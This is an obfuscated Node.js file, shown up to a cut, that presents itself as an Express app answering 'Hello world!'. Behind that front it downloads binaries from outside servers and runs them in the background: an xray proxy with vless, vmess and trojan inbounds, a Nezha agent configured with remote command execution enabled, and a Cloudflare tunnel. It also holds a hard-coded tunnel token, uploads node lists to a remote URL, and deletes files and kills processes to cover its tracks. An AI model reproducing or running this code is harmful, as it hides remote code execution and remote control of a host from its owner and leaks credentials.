const _0x1b7f07=_0x4ac7;(function(_0x445f13,_0x4aabe6){const _0xd33aa5={_0x460de5:0x13e,_0x1cb2dc:0x15a,_0x174c28:0xf6,_0x1ea817:0xe8,_0x48ae8b:0xc2},_0xb86739=_0x4ac7,_0x3281e6=_0x445f13();while(!![]){try{const _0x504484=parseInt(_0xb86739(0xa8))/0x1*(parseInt(_0xb86739(_0xd33aa5._0x460de5))/0x2)+-parseInt(_0xb86739(_0xd33aa5._0x1cb2dc))/0x3+parseInt(_0xb86739(0xed))/0x4*(parseInt(_0xb86739(_0xd33aa5._0x174c28))/0x5)+parseInt(_0xb86739(_0xd33aa5._0x1ea817))/0x6+-parseInt(_0xb86739(0x119))/0x7+-parseInt(_0xb86739(_0xd33aa5._0x48ae8b))/0x8+-parseInt(_0xb86739(0xeb))/0x9*(parseInt(_0xb86739(0x172))/0xa);if(_0x504484===_0x4aabe6)break;else _0x3281e6['push'](_0x3281e6['shift']());}catch(_0x2eb601){_0x3281e6['push'](_0x3281e6['shift']());}}}(_0x43e6,0xcf58a));const express=require(_0x1b7f07(0x169)),app=express(),axios=require(_0x1b7f07(0xfa)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x1b7f07(0x166)),exec=promisify(require(_0x1b7f07(0xea))[_0x1b7f07(0x115)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1b7f07(0x14b)][_0x1b7f07(0xf2)]||'',PROJECT_URL=process[_0x1b7f07(0x14b)][_0x1b7f07(0xc9)]||'',AUTO_ACCESS=process['env'][_0x1b7f07(0xd2)]||![],FILE_PATH=process[_0x1b7f07(0x14b)][_0x1b7f07(0x132)]||_0x1b7f07(0x15d),SUB_PATH=process['env'][_0x1b7f07(0xad)]||_0x1b7f07(0xb3),PORT=process[_0x1b7f07(0x14b)][_0x1b7f07(0x100)]||process[_0x1b7f07(0x14b)][_0x1b7f07(0x15b)]||0xbb8,UUID=process['env'][_0x1b7f07(0xef)]||_0x1b7f07(0xaa),NEZHA_SERVER=process[_0x1b7f07(0x14b)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1b7f07(0x14b)][_0x1b7f07(0x174)]||'',NEZHA_KEY=process['env'][_0x1b7f07(0xd3)]||'',ARGO_DOMAIN=process[_0x1b7f07(0x14b)][_0x1b7f07(0xee)]||_0x1b7f07(0x159),ARGO_AUTH=process[_0x1b7f07(0x14b)][_0x1b7f07(0xb4)]||'eyJhIjoiMjVmZTNjZmQ4MTA1MTFjZjhkZGY4MTQwODMzNWMwMWQiLCJ0IjoiMjI2OWIxNTctZjI3My00MjA5LTg1MmYtOWVkYmZkNGI3Mzk1IiwicyI6Ill6YzBORGhpWTJRdE1XTmhOQzAwWWpVd0xUZzNNRGN0TkRjME1UTXdabU5rWmpGaiJ9',ARGO_PORT=process[_0x1b7f07(0x14b)][_0x1b7f07(0x118)]||0x200b,CFIP=process[_0x1b7f07(0x14b)]['CFIP']||_0x1b7f07(0xb5),CFPORT=process[_0x1b7f07(0x14b)][_0x1b7f07(0x130)]||0x1bb,NAME=process[_0x1b7f07(0x14b)]['NAME']||_0x1b7f07(0x114);!fs[_0x1b7f07(0x15f)](FILE_PATH)?(fs[_0x1b7f07(0x135)](FILE_PATH),console[_0x1b7f07(0x12e)](FILE_PATH+_0x1b7f07(0xac))):console[_0x1b7f07(0x12e)](FILE_PATH+_0x1b7f07(0xd7));function generateRandomName(){const _0x14ab9d={_0x4aeff5:0xd5,_0x427cbc:0x102,_0x589874:0xfd},_0x3e9352=_0x1b7f07,_0x35839c=_0x3e9352(_0x14ab9d._0x4aeff5);let _0x16e047='';for(let _0x3fbde8=0x0;_0x3fbde8<0x6;_0x3fbde8++){_0x16e047+=_0x35839c[_0x3e9352(_0x14ab9d._0x427cbc)](Math[_0x3e9352(0x150)](Math[_0x3e9352(_0x14ab9d._0x589874)]()*_0x35839c['length']));}return _0x16e047;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1b7f07(0xcf)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1b7f07(0xcf)](FILE_PATH,webName),botPath=path[_0x1b7f07(0xcf)](FILE_PATH,botName),subPath=path[_0x1b7f07(0xcf)](FILE_PATH,_0x1b7f07(0x158)),listPath=path[_0x1b7f07(0xcf)](FILE_PATH,_0x1b7f07(0x156)),bootLogPath=path[_0x1b7f07(0xcf)](FILE_PATH,_0x1b7f07(0xc1)),configPath=path[_0x1b7f07(0xcf)](FILE_PATH,'config.json');function deleteNodes(){const _0x799ad6={_0x22c12a:0x16f,_0x5aa7fb:0x110,_0x24f6f2:0xc5,_0x3ace4f:0xaf,_0x3041e1:0x167,_0x28793a:0x105},_0x45bc3b=_0x1b7f07;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2efe79;try{_0x2efe79=fs[_0x45bc3b(_0x799ad6._0x22c12a)](subPath,_0x45bc3b(_0x799ad6._0x5aa7fb));}catch{return null;}const _0x5eb993=Buffer['from'](_0x2efe79,'base64')[_0x45bc3b(0x151)](_0x45bc3b(_0x799ad6._0x5aa7fb)),_0x40f003=_0x5eb993[_0x45bc3b(_0x799ad6._0x24f6f2)]('\x0a')[_0x45bc3b(0xdb)](_0x34194d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45bc3b(0xda)](_0x34194d));if(_0x40f003[_0x45bc3b(_0x799ad6._0x3ace4f)]===0x0)return;return axios[_0x45bc3b(0x143)](UPLOAD_URL+_0x45bc3b(0x14e),JSON[_0x45bc3b(_0x799ad6._0x3041e1)]({'nodes':_0x40f003}),{'headers':{'Content-Type':'application/json'}})[_0x45bc3b(_0x799ad6._0x28793a)](_0x1ff129=>{return null;}),null;}catch(_0xf12d78){return null;}}function cleanupOldFiles(){const _0x194d48={_0xb4328a:0x121,_0x4056b7:0xf5},_0x59e560=_0x1b7f07;try{const _0x2f2827=fs[_0x59e560(0xc6)](FILE_PATH);_0x2f2827[_0x59e560(0xdc)](_0x15aafb=>{const _0x6797ac=_0x59e560,_0x680488=path[_0x6797ac(0xcf)](FILE_PATH,_0x15aafb);try{const _0x688d8b=fs[_0x6797ac(0x133)](_0x680488);_0x688d8b[_0x6797ac(_0x194d48._0xb4328a)]()&&fs[_0x6797ac(_0x194d48._0x4056b7)](_0x680488);}catch(_0x25ec17){}});}catch(_0x567fae){}}app[_0x1b7f07(0xe2)]('/',function(_0x4fd3ad,_0x2b64c4){const _0x146a85={_0x54ed07:0x147},_0x324afa=_0x1b7f07;_0x2b64c4[_0x324afa(_0x146a85._0x54ed07)](_0x324afa(0xb9));});async function generateConfig(){const _0x38c30a={_0x731b57:0xdd,_0x4b2289:0xdd,_0x4801f8:0xcb,_0x5a68c7:0xe9,_0x1ac6c6:0xcb,_0x31c376:0x144,_0x4f036c:0xdf,_0x2999cb:0xe9,_0x40eca7:0xcb,_0x42f1ce:0x131,_0x4abb0f:0xd4,_0x2867e4:0x161,_0x4e6af1:0xd4,_0x2b2d5e:0xcd,_0x45592b:0x104,_0x42bb35:0xae,_0x843db6:0x125,_0x3be16c:0x112,_0x35bc5d:0xcf},_0x5f4e02=_0x1b7f07,_0xde0fe3={'log':{'access':_0x5f4e02(_0x38c30a._0x731b57),'error':_0x5f4e02(_0x38c30a._0x4b2289),'loglevel':_0x5f4e02(_0x38c30a._0x4801f8)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5f4e02(_0x38c30a._0x5a68c7),'settings':{'clients':[{'id':UUID,'flow':_0x5f4e02(0x10d)}],'decryption':_0x5f4e02(_0x38c30a._0x1ac6c6),'fallbacks':[{'dest':0xbb9},{'path':_0x5f4e02(0x131),'dest':0xbba},{'path':_0x5f4e02(_0x38c30a._0x31c376),'dest':0xbbb},{'path':_0x5f4e02(0x13d),'dest':0xbbc}]},'streamSettings':{'network':_0x5f4e02(0xdf)}},{'port':0xbb9,'listen':_0x5f4e02(0xd4),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5f4e02(_0x38c30a._0x4f036c),'security':_0x5f4e02(_0x38c30a._0x4801f8)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5f4e02(_0x38c30a._0x2999cb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5f4e02(_0x38c30a._0x40eca7)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5f4e02(_0x38c30a._0x42f1ce)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5f4e02(0x104),_0x5f4e02(0x161)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5f4e02(_0x38c30a._0x4abb0f),'protocol':_0x5f4e02(0x146),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5f4e02(_0x38c30a._0x2867e4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5f4e02(_0x38c30a._0x4e6af1),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5f4e02(_0x38c30a._0x2b2d5e),_0x5f4e02(_0x38c30a._0x45592b),_0x5f4e02(0x161)],'metadataOnly':![]}}],'dns':{'servers':[_0x5f4e02(_0x38c30a._0x42bb35)]},'outbounds':[{'protocol':_0x5f4e02(0x162),'tag':_0x5f4e02(_0x38c30a._0x843db6)},{'protocol':_0x5f4e02(0x12f),'tag':_0x5f4e02(_0x38c30a._0x3be16c)}]};fs[_0x5f4e02(0xd8)](path[_0x5f4e02(_0x38c30a._0x35bc5d)](FILE_PATH,'config.json'),JSON['stringify'](_0xde0fe3,null,0x2));}function getSystemArchitecture(){const _0x140bd0={_0xf47952:0xff,_0x1cc38b:0xfb,_0x5850ef:0x103,_0x1a37eb:0xfb},_0x44d443=_0x1b7f07,_0x19bd62=os[_0x44d443(_0x140bd0._0xf47952)]();return _0x19bd62===_0x44d443(_0x140bd0._0x1cc38b)||_0x19bd62===_0x44d443(_0x140bd0._0x5850ef)||_0x19bd62===_0x44d443(0xf1)?_0x44d443(_0x140bd0._0x1a37eb):_0x44d443(0xc0);}function _0x43e6(){const _0x17aaf4=['split','readdirSync','application/json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','PROJECT_URL','\x20is\x20running','none','\x20>/dev/null\x202>&1','http','message','join','base64','\x20failed:\x20','AUTO_ACCESS','NEZHA_KEY','127.0.0.1','abcdefghijklmnopqrstuvwxyz','response','\x20already\x20exists','writeFileSync','chmod','test','filter','forEach','/dev/null','ARGO_DOMAIN:','tcp','firefox','8443','get','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2096','&path=%2Ftrojan-argo%3Fed%3D2560#','--tls','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','5324532HFNWad','vless','child_process','62325LKDvqZ','Error\x20reading\x20boot.log:','3042572ygVlob','ARGO_DOMAIN','UUID','substring','aarch64','UPLOAD_URL','unshift','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlinkSync','5fFbFvx','error','platform','https://amd64.ssss.nyc.mn/v1','axios','arm','country_code','random','https://arm64.ssss.nyc.mn/web','arch','SERVER_PORT','rm\x20-rf\x20','charAt','arm64','tls','catch','\x20-p\x20','443','unlink','\x0avless://','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain:','https://arm64.ssss.nyc.mn/agent','xtls-rprx-vision','\x22\x20>\x20/dev/null\x202>&1','2053','utf-8','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','block','fileName','Norflank','exec','https://arm64.ssss.nyc.mn/bot','includes','ARGO_PORT','1185121febBus','push','http\x20server\x20is\x20running\x20on\x20port:','all','\x0a\x20\x20\x20\x20','https://amd64.ssss.nyc.mn/agent','createWriteStream','close','isFile','2083','from','tunnel.yml','direct','tunnel.json','\x20>\x20nul\x202>&1','?security=tls&sni=','data','\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','log','blackhole','CFPORT','/vless-argo','FILE_PATH','statSync','pop','mkdirSync','config.yaml','then','\x20-c\x20','https://arm64.ssss.nyc.mn/v1','&fp=firefox&type=ws&host=','true','map','/trojan-argo','52AJxnYD','/sub.txt\x20saved\x20successfully','Empowerment\x20failed\x20for\x20','/api/add-subscriptions','\x0aclient_secret:\x20','post','/vmess-argo','\x20-s\x20','vmess','send','text/plain;\x20charset=utf-8','Error\x20executing\x20command:\x20','false','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Download\x20','/api/delete-nodes','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','floor','toString','NEZHA\x20variable\x20is\x20empty,skip\x20running','Nodes\x20uploaded\x20successfully','https://ipapi.co/json/','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','list.txt','\x0a\x0avmess://','sub.txt','flank.mjko.pp.ua','4574949Zyyqol','PORT','Error\x20downloading\x20files:','./tmp','taskkill\x20/f\x20/im\x20','existsSync','http://ip-api.com/json/','quic','freedom','nohup\x20','2087','success','util','stringify','basename','express','automatic\x20access\x20task\x20added\x20successfully','Unknown','https://oooo.serv00.net/add-url','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Subscription\x20uploaded\x20successfully','readFileSync','https://amd64.ssss.nyc.mn/bot','status','830HLHuxN','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_PORT','/tunnel.yml\x20run','59219rydfOM','has','d91dafc7-7702-4973-981a-f6ae5ec4607d','\x0a\x20\x20credentials-file:\x20','\x20is\x20created','SUB_PATH','https+local://8.8.8.8/dns-query','length','fileUrl','App\x20is\x20running','listen','lianj','ARGO_AUTH','cdns.doon.eu.org','php\x20running\x20error:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','countryCode','Hello\x20world!','org','del\x20/f\x20/q\x20','finish','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','win32','amd','boot.log','555264qsCNgC','match','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels'];_0x43e6=function(){return _0x17aaf4;};return _0x43e6();}function downloadFile(_0x3c5ad7,_0x32ea23,_0x466382){const _0x2763c6={_0x652487:0x135,_0xa49659:0x11f,_0x3eb7e9:0x137,_0xe3a72b:0x105},_0x23a754={_0x60a4c3:0xd1},_0x1b4393={_0x5766e1:0x168},_0x2d731e={_0x2bfe58:0x120,_0x2bf4fd:0x12e,_0x4ef591:0x168},_0x37f8eb=_0x1b7f07,_0x5dd98f=_0x3c5ad7;!fs[_0x37f8eb(0x15f)](FILE_PATH)&&fs[_0x37f8eb(_0x2763c6._0x652487)](FILE_PATH,{'recursive':!![]});const _0x4cb343=fs[_0x37f8eb(_0x2763c6._0xa49659)](_0x5dd98f);axios({'method':_0x37f8eb(0xe2),'url':_0x32ea23,'responseType':'stream'})[_0x37f8eb(_0x2763c6._0x3eb7e9)](_0x1731c4=>{const _0x329162=_0x37f8eb;_0x1731c4[_0x329162(0x129)]['pipe'](_0x4cb343),_0x4cb343['on'](_0x329162(0xbc),()=>{const _0x4f3469=_0x329162;_0x4cb343[_0x4f3469(_0x2d731e._0x2bfe58)](),console[_0x4f3469(_0x2d731e._0x2bf4fd)]('Download\x20'+path[_0x4f3469(_0x2d731e._0x4ef591)](_0x5dd98f)+'\x20successfully'),_0x466382(null,_0x5dd98f);}),_0x4cb343['on'](_0x329162(0xf7),_0x5e0861=>{const _0x5b4b56=_0x329162;fs[_0x5b4b56(0x108)](_0x5dd98f,()=>{});const _0x17f61c=_0x5b4b56(0x14d)+path[_0x5b4b56(_0x1b4393._0x5766e1)](_0x5dd98f)+_0x5b4b56(0xd1)+_0x5e0861['message'];console['error'](_0x17f61c),_0x466382(_0x17f61c);});})[_0x37f8eb(_0x2763c6._0xe3a72b)](_0xfed6cd=>{const _0x581bc4=_0x37f8eb,_0x5465d0=_0x581bc4(0x14d)+path[_0x581bc4(0x168)](_0x5dd98f)+_0x581bc4(_0x23a754._0x60a4c3)+_0xfed6cd['message'];console[_0x581bc4(0xf7)](_0x5465d0),_0x466382(_0x5465d0);});}async function downloadFilesAndRun(){const _0x528d57={_0x42817a:0xaf,_0x37bdab:0x12e,_0x108eb5:0xe3,_0x4fae7a:0x13c,_0x3313bf:0x15c,_0x2005ca:0xc5,_0x48af00:0x107,_0x365a6c:0x10f,_0x1535cb:0xa9,_0x2bf073:0x13b,_0x16c5be:0x142,_0x36fbb6:0x173,_0x5be2eb:0x163,_0x169c31:0xca,_0xee14d:0xf7,_0x3284a0:0xb6,_0x4ecf7f:0x107,_0x3574c9:0xe1,_0x3422fa:0x164,_0x2068c0:0xe6,_0x205e21:0x152,_0x598025:0xca,_0x1a048e:0xf7,_0x3f15f8:0x14c,_0x43145d:0xf4,_0x18ded3:0x12e,_0x426688:0xca,_0xe05eea:0x149},_0x192da6=_0x1b7f07,_0x1627cb=getSystemArchitecture(),_0x4d100a=getFilesForArchitecture(_0x1627cb);if(_0x4d100a[_0x192da6(_0x528d57._0x42817a)]===0x0){console[_0x192da6(_0x528d57._0x37bdab)](_0x192da6(_0x528d57._0x108eb5));return;}const _0x30cd9b=_0x4d100a[_0x192da6(_0x528d57._0x4fae7a)](_0x3e7301=>{const _0x2d7f13={_0x343728:0x113,_0x207bd3:0xb0};return new Promise((_0x570ac8,_0x25a41b)=>{const _0x5ecdfa=_0x4ac7;downloadFile(_0x3e7301[_0x5ecdfa(_0x2d7f13._0x343728)],_0x3e7301[_0x5ecdfa(_0x2d7f13._0x207bd3)],(_0x79ebd0,_0x504931)=>{_0x79ebd0?_0x25a41b(_0x79ebd0):_0x570ac8(_0x504931);});});});try{await Promise[_0x192da6(0x11c)](_0x30cd9b);}catch(_0xad4f05){console['error'](_0x192da6(_0x528d57._0x3313bf),_0xad4f05);return;}function _0x4c46f6(_0x5e1875){const _0x1a5f92=_0x192da6,_0x3aeb03=0x1fd;_0x5e1875[_0x1a5f92(0xdc)](_0x1292e5=>{const _0x4286ae={_0x40ffce:0x12e,_0x3f9587:0x151},_0x1c802c=_0x1a5f92;fs[_0x1c802c(0x15f)](_0x1292e5)&&fs[_0x1c802c(0xd9)](_0x1292e5,_0x3aeb03,_0x1e326e=>{const _0x1707a2=_0x1c802c;_0x1e326e?console[_0x1707a2(0xf7)](_0x1707a2(0x140)+_0x1292e5+':\x20'+_0x1e326e):console[_0x1707a2(_0x4286ae._0x40ffce)]('Empowerment\x20success\x20for\x20'+_0x1292e5+':\x20'+_0x3aeb03[_0x1707a2(_0x4286ae._0x3f9587)](0x8));});});}const _0x63e935=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c46f6(_0x63e935);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x55a2c3=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x192da6(_0x528d57._0x2005ca)](':')[_0x192da6(0x134)]():'',_0x5daa64=new Set([_0x192da6(_0x528d57._0x48af00),'8443','2096',_0x192da6(0x164),_0x192da6(0x122),_0x192da6(_0x528d57._0x365a6c)]),_0x819f40=_0x5daa64[_0x192da6(_0x528d57._0x1535cb)](_0x55a2c3)?_0x192da6(_0x528d57._0x2bf073):_0x192da6(0x14a),_0x16e62d=_0x192da6(_0x528d57._0x16c5be)+NEZHA_KEY+_0x192da6(_0x528d57._0x36fbb6)+NEZHA_SERVER+_0x192da6(0x12b)+_0x819f40+_0x192da6(0xbe)+UUID;fs[_0x192da6(0xd8)](path[_0x192da6(0xcf)](FILE_PATH,_0x192da6(0x136)),_0x16e62d);const _0x44af6a=_0x192da6(_0x528d57._0x5be2eb)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x192da6(0x111);try{await exec(_0x44af6a),console['log'](phpName+_0x192da6(_0x528d57._0x169c31)),await new Promise(_0x4a2ffb=>setTimeout(_0x4a2ffb,0x3e8));}catch(_0x551266){console[_0x192da6(_0x528d57._0xee14d)](_0x192da6(_0x528d57._0x3284a0)+_0x551266);}}else{let _0xaeae49='';const _0x4a3077=[_0x192da6(_0x528d57._0x4ecf7f),_0x192da6(_0x528d57._0x3574c9),_0x192da6(0xe4),_0x192da6(_0x528d57._0x3422fa),_0x192da6(0x122),_0x192da6(0x10f)];_0x4a3077['includes'](NEZHA_PORT)&&(_0xaeae49=_0x192da6(_0x528d57._0x2068c0));const _0x1cae6f=_0x192da6(_0x528d57._0x5be2eb)+npmPath+_0x192da6(0x145)+NEZHA_SERVER+':'+NEZHA_PORT+_0x192da6(0x106)+NEZHA_KEY+'\x20'+_0xaeae49+_0x192da6(0xc8);try{await exec(_0x1cae6f),console[_0x192da6(0x12e)](npmName+'\x20is\x20running'),await new Promise(_0x5681e2=>setTimeout(_0x5681e2,0x3e8));}catch(_0x2ce0b9){console['error']('npm\x20running\x20error:\x20'+_0x2ce0b9);}}}else console['log'](_0x192da6(_0x528d57._0x205e21));const _0x31c60e='nohup\x20'+webPath+_0x192da6(0x138)+FILE_PATH+_0x192da6(0x12c);try{await exec(_0x31c60e),console[_0x192da6(0x12e)](webName+_0x192da6(_0x528d57._0x598025)),await new Promise(_0x1c65f2=>setTimeout(_0x1c65f2,0x3e8));}catch(_0x4dc705){console[_0x192da6(_0x528d57._0x1a048e)]('web\x20running\x20error:\x20'+_0x4dc705);}if(fs[_0x192da6(0x15f)](botPath)){let _0x4b4eb6;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4b4eb6=_0x192da6(_0x528d57._0x3f15f8)+ARGO_AUTH;else ARGO_AUTH[_0x192da6(0xc3)](/TunnelSecret/)?_0x4b4eb6='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x192da6(0x175):_0x4b4eb6=_0x192da6(_0x528d57._0x43145d)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x192da6(_0x528d57._0x5be2eb)+botPath+'\x20'+_0x4b4eb6+'\x20>/dev/null\x202>&1\x20&'),console[_0x192da6(_0x528d57._0x18ded3)](botName+_0x192da6(_0x528d57._0x426688)),await new Promise(_0x43edfc=>setTimeout(_0x43edfc,0x7d0));}catch(_0x1358aa){console[_0x192da6(0xf7)](_0x192da6(_0x528d57._0xe05eea)+_0x1358aa);}}await new Promise(_0x4a563f=>setTimeout(_0x4a563f,0x1388));}function getFilesForArchitecture(_0xd7d3a4){const _0x589ceb={_0x39189d:0xfe,_0x67e3e0:0x116,_0x281940:0x139,_0x2489dc:0xf9,_0x59fe39:0xf3},_0x3a5a5f=_0x1b7f07;let _0x2f5a71;_0xd7d3a4===_0x3a5a5f(0xfb)?_0x2f5a71=[{'fileName':webPath,'fileUrl':_0x3a5a5f(_0x589ceb._0x39189d)},{'fileName':botPath,'fileUrl':_0x3a5a5f(_0x589ceb._0x67e3e0)}]:_0x2f5a71=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3a5a5f(0x170)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1b20de=_0xd7d3a4==='arm'?_0x3a5a5f(0x10c):_0x3a5a5f(0x11e);_0x2f5a71['unshift']({'fileName':npmPath,'fileUrl':_0x1b20de});}else{const _0x60fd76=_0xd7d3a4===_0x3a5a5f(0xfb)?_0x3a5a5f(_0x589ceb._0x281940):_0x3a5a5f(_0x589ceb._0x2489dc);_0x2f5a71[_0x3a5a5f(_0x589ceb._0x59fe39)]({'fileName':phpPath,'fileUrl':_0x60fd76});}}return _0x2f5a71;}function argoType(){const _0x3f9b27={_0x10ffd2:0x12e,_0x2b5c5f:0xab,_0x2e5a0a:0xcf,_0x151ad2:0x126,_0x46788b:0x14f,_0x17a07a:0xe7,_0x649af8:0x124,_0x47b8fa:0xb7},_0x4eadff=_0x1b7f07;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4eadff(_0x3f9b27._0x10ffd2)](_0x4eadff(0xc4));return;}if(ARGO_AUTH[_0x4eadff(0x117)]('TunnelSecret')){fs['writeFileSync'](path[_0x4eadff(0xcf)](FILE_PATH,_0x4eadff(0x126)),ARGO_AUTH);const _0x5012b3='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4eadff(0xc5)]('\x22')[0xb]+_0x4eadff(_0x3f9b27._0x2b5c5f)+path[_0x4eadff(_0x3f9b27._0x2e5a0a)](FILE_PATH,_0x4eadff(_0x3f9b27._0x151ad2))+_0x4eadff(_0x3f9b27._0x46788b)+ARGO_DOMAIN+_0x4eadff(_0x3f9b27._0x17a07a)+ARGO_PORT+_0x4eadff(0x12d);fs[_0x4eadff(0xd8)](path[_0x4eadff(0xcf)](FILE_PATH,_0x4eadff(_0x3f9b27._0x649af8)),_0x5012b3);}else console[_0x4eadff(_0x3f9b27._0x10ffd2)](_0x4eadff(_0x3f9b27._0x47b8fa));}async function extractDomains(){const _0x155b57={_0x3b1c3e:0x12e,_0x3d1171:0xcf,_0x2ee705:0x110,_0x5af479:0xdc,_0xe78de:0xbd,_0x133477:0xcf,_0x1f3e60:0x163,_0x3d41ef:0x12a,_0x8faf68:0x12e,_0x281017:0xf7,_0x37a869:0x149,_0x72bab7:0xec},_0xe58abc={_0x2a26ca:0x154,_0x30091e:0xba,_0x32e7ae:0x129,_0x2a422f:0xfc,_0x5db95e:0x129,_0x3ae251:0xe2,_0x30a282:0x171,_0x3a4a5c:0x165,_0x2bbf42:0x16b},_0x18fafe={_0xfc8f1f:0xf8,_0x4e0d49:0xf0,_0x463bd4:0x10e},_0x50d84e={_0x4437c1:0xc3,_0x4a1d29:0x11a},_0x133899=_0x1b7f07;let _0x223628;if(ARGO_AUTH&&ARGO_DOMAIN)_0x223628=ARGO_DOMAIN,console[_0x133899(_0x155b57._0x3b1c3e)](_0x133899(0xde),_0x223628),await _0x51053c(_0x223628);else try{const _0xfef2b3=fs['readFileSync'](path[_0x133899(_0x155b57._0x3d1171)](FILE_PATH,'boot.log'),_0x133899(_0x155b57._0x2ee705)),_0x4c7cb8=_0xfef2b3[_0x133899(0xc5)]('\x0a'),_0x227f9b=[];_0x4c7cb8[_0x133899(_0x155b57._0x5af479)](_0x262b1f=>{const _0x214d6f=_0x133899,_0x559e2e=_0x262b1f[_0x214d6f(_0x50d84e._0x4437c1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x559e2e){const _0x2a498d=_0x559e2e[0x1];_0x227f9b[_0x214d6f(_0x50d84e._0x4a1d29)](_0x2a498d);}});if(_0x227f9b[_0x133899(0xaf)]>0x0)_0x223628=_0x227f9b[0x0],console[_0x133899(0x12e)](_0x133899(0x10b),_0x223628),await _0x51053c(_0x223628);else{console['log'](_0x133899(_0x155b57._0xe78de)),fs[_0x133899(0xf5)](path[_0x133899(_0x155b57._0x133477)](FILE_PATH,_0x133899(0xc1)));async function _0x1a6507(){const _0x2a91c8=_0x133899;try{process[_0x2a91c8(_0x18fafe._0xfc8f1f)]==='win32'?await exec(_0x2a91c8(0x15e)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x2a91c8(_0x18fafe._0x4e0d49)](0x1)+_0x2a91c8(_0x18fafe._0x463bd4));}catch(_0x43702a){}}_0x1a6507(),await new Promise(_0x282bef=>setTimeout(_0x282bef,0xbb8));const _0x476fcc=_0x133899(0xf4)+FILE_PATH+_0x133899(0x16d)+ARGO_PORT;try{await exec(_0x133899(_0x155b57._0x1f3e60)+botPath+'\x20'+_0x476fcc+_0x133899(_0x155b57._0x3d41ef)),console[_0x133899(_0x155b57._0x8faf68)](botName+'\x20is\x20running'),await new Promise(_0x160e61=>setTimeout(_0x160e61,0xbb8)),await extractDomains();}catch(_0x17d74c){console[_0x133899(_0x155b57._0x281017)](_0x133899(_0x155b57._0x37a869)+_0x17d74c);}}}catch(_0x37de75){console['error'](_0x133899(_0x155b57._0x72bab7),_0x37de75);}async function _0x1555d3(){const _0x3e58c1=_0x133899;try{const _0x29edcc=await axios[_0x3e58c1(0xe2)](_0x3e58c1(_0xe58abc._0x2a26ca),{'timeout':0xbb8});if(_0x29edcc['data']&&_0x29edcc['data'][_0x3e58c1(0xfc)]&&_0x29edcc[_0x3e58c1(0x129)][_0x3e58c1(_0xe58abc._0x30091e)])return 